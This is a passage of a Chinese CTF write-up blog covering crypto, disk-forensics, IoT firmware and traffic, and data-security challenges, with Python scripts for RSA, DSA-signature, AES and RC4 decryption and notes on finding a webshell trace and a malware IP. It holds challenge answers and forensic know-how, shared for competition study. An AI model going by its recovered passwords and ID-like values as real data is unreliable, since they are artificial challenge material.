class="number">67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572</span>,</span><br><span class="line">     <span class="number">13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727</span>,</span><br><span class="line">     <span class="number">95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p^<span class="number">2</span> -<span class="number">1</span> )*(p^<span class="number">2</span>-p)*(q^<span class="number">2</span>-<span class="number">1</span>)*(q^<span class="number">2</span> - q)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">M = C ** d</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> M:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> row:</span><br><span class="line">        flag += <span class="built_in">str</span>(long_to_bytes(<span class="built_in">int</span>(value)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="糟糕的磁盘"><a href="#糟糕的磁盘" class="headerlink" title="糟糕的磁盘"></a>糟糕的磁盘</h4><p>用取证大师进行取证，发现RAID-0</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188289572-1d97f067-ecb1-4b95-8aec-5fc8feca5474.png" alt="img" data-caption="img" loading="lazy"></p>
<p>加密的文件</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188341582-ecf089a0-4b33-4d8e-a94e-c1f43ebbd85d.png" alt="img" data-caption="img" loading="lazy"></p>
<p>key是key.png</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188432992-79562d3b-5c1b-4dc8-b590-3235dbfb030c.png" alt="img" data-caption="img" loading="lazy"></p>
<p>用veracrypt挂载</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188599396-d9f0c0e1-046f-4f71-bcfb-487aec802141.png" alt="img" data-caption="img" loading="lazy"></p>
<p>得到flag</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188626252-c1ca018a-2563-43c1-81c4-41e5a2ceb502.png" alt="img" data-caption="img" loading="lazy"></p>
<h3 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h3><h4 id="blink"><a href="#blink" class="headerlink" title="blink"></a>blink</h4><p>binwalk提不了，直接一坨放ida看了，esp的bin文件</p>
<p>看了很久的逻辑没找到关键逻辑，直接shift 12搜搜字符串，看到可疑字符串如下，交了即是flag</p>
<p>rtosandmorseisveryeasyhahhaha</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737191080331-92761799-490d-44d5-8dfd-86dc690c27cb.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="sharkp"><a href="#sharkp" class="headerlink" title="sharkp"></a>sharkp</h4><p>分析流量发现接口大概确定是这下面两个</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737191029630-964e3155-40c6-4389-935e-99aaacddcaf3.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189883929-a03876e9-3bd1-426f-9e70-12f67e969565.png" alt="img" data-caption="img" loading="lazy"></p>
<p>在后面又发现了可执行文件保存下来</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189917735-542504b6-e33a-4a76-9995-89ebe909b06b.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189881991-541c9b61-cb06-44bd-bde0-8375cb768ee2.png" alt="img" data-caption="img" loading="lazy"></p>
<p>丢尽沙箱（安恒沙箱真好用！！！）发现IP</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189807617-f7685156-1aee-4681-ab1d-46cc9dd8fd89.png" alt="img" data-caption="img" loading="lazy"></p>
<p>最后提交成功 <code>setConfigUpload_115.195.88.161</code></p>
<h3 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h3><h4 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h4><p>分析error.log，有上马的痕迹</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189586576-c32e9def-c21b-47e8-85f9-d8b7ae9ba793.png" alt="img" data-caption="img" loading="lazy"></p>
<p>这里有上传图片的痕迹，提取出来</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189644814-8d8a9c84-bcd3-4ff1-804f-698c7f06c79b.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189698867-bff0e39d-dca9-4c16-837d-d69d88a003c4.jpeg" alt="img" data-caption="img" loading="lazy"></p>
<p>puzzlesolver一把梭，发现密码 <code>dataPersonPass123987</code></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189492496-aec25c24-464c-4d3b-968f-e81daa3fea42.png" alt="img" data-caption="img" loading="lazy"></p>
<p>下面有上传zip的痕迹</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189759327-ecb9114c-3ab0-49f5-a416-d7ce12df63cc.png" alt="img" data-caption="img" loading="lazy"></p>
<p>拼接的zip，提出来</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189547779-4c7ece84-5be8-4153-b5a6-739e20059ca7.png" alt="img" data-caption="img" loading="lazy"></p>
<p>解压zip获得 <code>data.csv</code></p>
<p>但是乱码改成txt得到张三信息，即 <code>30601319731003117X_79159498824</code></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189669963-a7b00e45-1b78-41ee-9a6d-360f7548ddaf.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="DSASignatureData"><a href="#DSASignatureData" class="headerlink" title="DSASignatureData"></a>DSASignatureData</h4><p>本题目要求对数据进行验签，分析数据包，在数据包中是个人基础信息</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188843534-4295e425-cf19-40f7-8f33-14706545a0c4.png" alt="img" data-caption="img" loading="lazy"></p>
<p>那就先提取数据，然后按照规定进行验证</p>
<p>先把多余的流量去掉，只保留传的json</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737188977130-a3f5fc87-eb28-4f8a-9786-7b9188493db5.png" alt="img" data-caption="img" loading="lazy"></p>
<p>然后用tshark，提取用户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object -E separator=, &gt; extracted_data.txt</span><br></pre></td></tr></table></figure>

<p>然后整理得到这个csv</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189167315-7ef97e0c-d5f5-4b9a-a280-ead5bdc5d896.png" alt="img" data-caption="img" loading="lazy"></p>
<p>然后按照规则，验证签名，然后得到错误结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> DSS</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">public_keys = &#123;&#125;</span><br><span class="line">public_folder = <span class="string">&#x27;public&#x27;</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(public_folder):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.pem&#x27;</span>):</span><br><span class="line">        userid = filename[<span class="number">7</span>:<span class="number">11</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(public_folder, filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">            public_key = DSA.import_key(key_file.read())</span><br><span class="line">            public_keys[userid] = public_key</span><br><span class="line"></span><br><span class="line">sign_data_file = <span class="string">&#x27;data-sign.csv&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sign_data_file, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    reader = csv.DictReader(csvfile)</span><br><span class="line">    altered_data = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        userid = row[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        name_signature = base64.b64decode(row[<span class="string">&#x27;name_signature&#x27;</span>])</span><br><span class="line">        idcard_signature = base64.b64decode(row[<span class="string">&#x27;idcard_signature&#x27;</span>])</span><br><span class="line">        phone_signature = base64.b64decode(row[<span class="string">&#x27;phone_signature&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        original_data_file = <span class="string">&#x27;extracted_data.csv&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(original_data_file, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>) <span class="keyword">as</span> original_csvfile:</span><br><span class="line">            original_reader = csv.DictReader(original_csvfile)</span><br><span class="line">            <span class="keyword">for</span> original_row <span class="keyword">in</span> original_reader:</span><br><span class="line">                <span class="keyword">if</span> original_row[<span class="string">&#x27;user&#x27;</span>] == userid:</span><br><span class="line">                    data_str = original_row[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">                    data_dict = json.loads(data_str.replace(<span class="string">&#x27;&quot;&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>).replace(<span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        name = data_dict[<span class="string">&#x27;name&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">        public_key = public_keys.get(userid.zfill(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> public_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            signer = DSS.new(public_key, <span class="string">&#x27;fips-186-3&#x27;</span>)</span><br><span class="line">            name_hash = SHA256.new(name.encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(name_hash, name_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 name 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 name 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;name&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            idcard_hash = SHA256.new(data_dict[<span class="string">&#x27;idcard&#x27;</span>].encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(idcard_hash, idcard_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 idcard 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 idcard 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;idcard&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            phone_hash = SHA256.new(data_dict[<span class="string">&#x27;phone&#x27;</span>].encode())</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                signer.verify(phone_hash, phone_signature)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 phone 验证通过&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;用户 <span class="subst">&#123;userid&#125;</span> 的 phone 验证失败&quot;</span>)</span><br><span class="line">                altered_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;userid&#x27;</span>: userid,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;idcard&#x27;</span>: data_dict[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;phone&#x27;</span>: data_dict[<span class="string">&#x27;phone&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;error_field&#x27;</span>: <span class="string">&#x27;phone&#x27;</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未找到 <span class="subst">&#123;userid&#125;</span> 对应的公钥&quot;</span>)</span><br><span class="line"></span><br><span class="line">altered_file = <span class="string">&#x27;altered_data.csv&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(altered_file, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    fieldnames = [<span class="string">&#x27;userid&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;idcard&#x27;</span>, <span class="string">&#x27;phone&#x27;</span>]</span><br><span class="line">    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)</span><br><span class="line">    writer.writeheader()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> altered_data:</span><br><span class="line">        writer.writerow(&#123;</span><br><span class="line">            <span class="string">&#x27;userid&#x27;</span>: row[<span class="string">&#x27;userid&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: row[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;idcard&#x27;</span>: row[<span class="string">&#x27;idcard&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;phone&#x27;</span>: row[<span class="string">&#x27;phone&#x27;</span>]</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737189302033-2adecec7-5435-410e-8bf8-a12a3dcd4369.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="easyrawencode"><a href="#easyrawencode" class="headerlink" title="easyrawencode"></a>easyrawencode</h4><p>附件是给raw，进行取证</p>
<p>发现了有对data.csv加密的过程</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194299081-da72c9ea-2cab-42df-940f-fb5207cec260.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194180629-008c50bf-7fa4-4dc9-b2a4-75d92bc4d6c7.png" alt="img" data-caption="img" loading="lazy"></p>
<p>所用到的私钥</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194354896-d6c94554-0288-4576-ba24-735535a4b90b.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194247972-467719d5-34ca-4908-9b14-df3d06c0cd1b.png" alt="img" data-caption="img" loading="lazy"></p>
<p>查看注册表，找到<code>hackkey</code>的值</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737194187345-b65d7461-9407-41e8-850a-ab4e933ee977.png" alt="img" data-caption="img" loading="lazy"></p>
<p>查看console的执行过程，发现有执行结果</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737212498603-b5498d04-6048-416e-acae-54158e803dc8.png" alt="img" data-caption="img" loading="lazy"></p>
<p>分析脚本，用的AES对内容进行的加密，那就编写脚本对其进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">enckey = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334&quot;</span>)</span><br><span class="line">nonce = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d919c229aab6535efa09a52c589c8f47&quot;</span>)</span><br><span class="line">tag = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5b204675b1b173c32c04b0b8a100ee29&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取私钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pri_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    enc_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用RSA私钥解密AES密钥</span></span><br><span class="line">de_rsa = PKCS1_OAEP.new(pri_key)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    aes_key_decrypted = de_rsa.decrypt(enckey)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA解密AES密钥失败：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用解密后的AES密钥解密文件数据</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    de_aes = AES.new(aes_key_decrypted, AES.MODE_EAX, nonce=nonce)</span><br><span class="line">    decrypted_data = de_aes.decrypt_and_verify(enc_data, tag)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES解密失败或验证失败：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的数据写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decrypted_data.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Successfully decrypted data&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>解开得到csv，发现最后一列是加密的</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196023983-823561b2-34d2-4370-ab10-2c17b224eb86.png" alt="img" data-caption="img" loading="lazy"></p>
<p>个人签名是用的RC4加密的</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196008031-7f2d896a-8cc5-4bc1-8408-10015234a522.png" alt="img" data-caption="img" loading="lazy"></p>
<p>写脚本解密，找到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;decrypted_data.csv&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> index, row <span class="keyword">in</span> data.iterrows():</span><br><span class="line">    encrypted = row[<span class="string">&#x27;个性签名(加密版)&#x27;</span>]</span><br><span class="line">    password = row[<span class="string">&#x27;密码&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    enc_de_base64 = base64.b64decode(encrypted)</span><br><span class="line">    rc4 = ARC4.new(password.encode())</span><br><span class="line">    de_rc4 = rc4.decrypt(enc_de_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;DASCTF&#123;&quot;</span> <span class="keyword">in</span> de_rc4:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;得到结果:<span class="subst">&#123;de_rc4&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/1737196833241-25e823bb-42c0-4d5f-990c-b67ef1e6792f.png" alt="img" data-caption="img" loading="lazy"></p>

    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF/" rel="tag">CTF</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1740987897700"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            
            
            <button class="mdui-fab catalog" style="overflow:unset;">
                <i class="nexmoefont icon-i-catalog"></i>
                <div class="nexmoe-toc">
